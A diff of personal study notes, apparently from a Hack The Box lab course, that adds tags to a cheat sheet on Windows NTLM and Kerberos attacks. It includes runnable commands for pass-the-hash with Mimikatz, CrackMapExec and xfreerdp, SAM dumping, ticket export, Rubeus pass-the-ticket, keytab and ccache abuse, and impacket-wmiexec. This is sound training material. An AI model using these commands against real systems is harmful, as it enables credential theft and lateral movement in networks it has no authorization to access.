@@ -1,3 +1,4 @@
+#NTLM
 ## [Windows NTLM](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview)
 Set of security protocols that authenticates users identities while protecting the integrity and confidentiality of their data. 
 NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol. 
@@ -7,12 +8,13 @@ Kerberos has taken over as the default authentication methods in Windows 2000 an
 
 Passwords stored on the server and domain controllers are not salted. Allows an adversary with a password hash to authenticate a session without knowing the original password. 
 
+#PtH 
 ## [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/)
 You can use a password hash instead of a plain text password for authentication. 
 - Dumping the local SAM database from a compromised host.
 - Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
 - Pulling the hashes from memory (lsass.exe).
-
+#MimiKatz
 ### Mimikatz
 Has a module named sekurlsa::pth
 Required options:
@@ -24,6 +26,7 @@ Required options:
 ```cmd
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
 ```
+#SAM
 #### Dump SAM
 ```cmd
 reg save HKLM\SAM sambkup.hiv
@@ -88,7 +91,7 @@ crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0
 Need to include domain for domain accounts
 administrator@inlanefreight.htb
 
-### PtH with RDP Linux 
+### #PtH with RDP Linux 
 
 PtH to gain GUI access
 Restricted Admin Mode, needs to be enabled.
@@ -101,12 +104,12 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ```
 
-### UAC Limits 
+### #UAC Limits 
 
 UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
 
 # Kerberos Protocol
-
+#Kerberos
 Idea is to not give an account password to every service you use. Instead Kerberos keeps all tickets on the local system and presents each service the specific ticket for that service. 
 This prevents a ticket being used for 2 service. 
 
@@ -126,7 +129,7 @@ User tickets have the user name followed by a @ that seperates the service name 
 	`[randomvalue]-username@service-domain.local.kirbi`.
 To get all tickets will need to execute as admin
 
-##### MimiKatz
+##### #MimiKatz
 ```cmd
 mimikatz.exe privilige::debug "sekurlsa::tickets /export"
 ```
@@ -153,7 +156,7 @@ Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068
 ```
 
 ### Pass the Ticket 
-#### Rubeus
+#### #Rubeus
 ```cmd
 Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
 ```
@@ -246,7 +249,7 @@ crontab -l
 Look for [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html)
 	Allows for interaction with Kerberos 
 	Functions to request users TGT and store in cache (ccache)
-##### Abusing KeyTab Files 
+##### Abusing #KeyTab Files 
 List keytab File information 
 ```shell
 klist -k -t 
@@ -341,7 +344,7 @@ Set the KRB5CCNAME Enviromental Variable
 export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
 ```
 #### Impacket 
-
+#impacket
 ```shell
 proxychains impacket-wmiexec dc01 -k
 ```
